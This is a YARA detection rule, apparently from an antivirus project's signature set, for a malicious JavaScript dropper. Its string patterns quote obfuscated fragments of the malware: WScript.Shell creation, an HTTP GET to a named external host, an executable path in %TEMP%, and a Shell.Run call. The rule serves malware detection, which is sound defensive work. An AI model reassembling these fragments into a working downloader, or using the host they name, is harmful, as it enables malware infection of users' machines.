rule sig_20160328_c114815d1a644808ff856399e30a04ce {
  meta:
    description = "datamaliciousorder - file 20160328_c114815d1a644808ff856399e30a04ce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "10fdad0be4f63669a8b14d5252693b215acf925e783c07df812558b9bdc50ee2"

  strings:
    $s1  = "function Tgmmxcgjd() {return Fjpmohbzr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"w3mmwOf9AFd3zXQ.exe\";};" fullword ascii
    $s2  = "do {WScript[Rwjccked](Zhpfamuz() * 11)} while (Rmpmfda[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Fjpmohbzr = function Zullxknot() {return WScript[Ruqwttrcg](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Rmpmfda[Jqrouf](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s5  = "function Pzbbt(Pgsyp, Zaavejq){return Pgsyp - Zaavejq;};" fullword ascii
    $s6  = "function Vrchqno(Rqurqlvv){Fjpmohbzr[\"Run\"](Rqurqlvv, Tlhih, Tlhih);};" fullword ascii
    $s7  = "function Gdegcup() {return ((Cfuobenr == true) && (Cfuobenr == Zaxlumldt)) ? 1 : Tlhih;};" fullword ascii
    $s8  = "var Pigfbqw = new this[\"Date\"]();" fullword ascii
    $s9  = "function Zhpfamuz(){return 22;};" fullword ascii
    $s10 = "var Cfuobenr = false;" fullword ascii
    $s11 = "Cfuobenr = true; " fullword ascii
    $s12 = "var Zffuvk = false;" fullword ascii
    $s13 = "return Pzbbt(Gqrram, Buovmwdov);" fullword ascii
    $s14 = "function Safaxhaou(Qynqaptddm) {var Cyudlyhoh = (1, 2, 3, 4, 5, Qynqaptddm); return Cyudlyhoh;};" fullword ascii
    $s15 = "function Elqzjofe(){return Ruqwttrcg;};" fullword ascii
    $s16 = "function Axfggr(){return Klljlat;};" fullword ascii
    $s17 = " while (Tiegy){" fullword ascii
    $s18 = "var Zaxlumldt = false;" fullword ascii
    $s19 = "function Agzcetjs()" fullword ascii
    $s20 = "Zaxlumldt = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}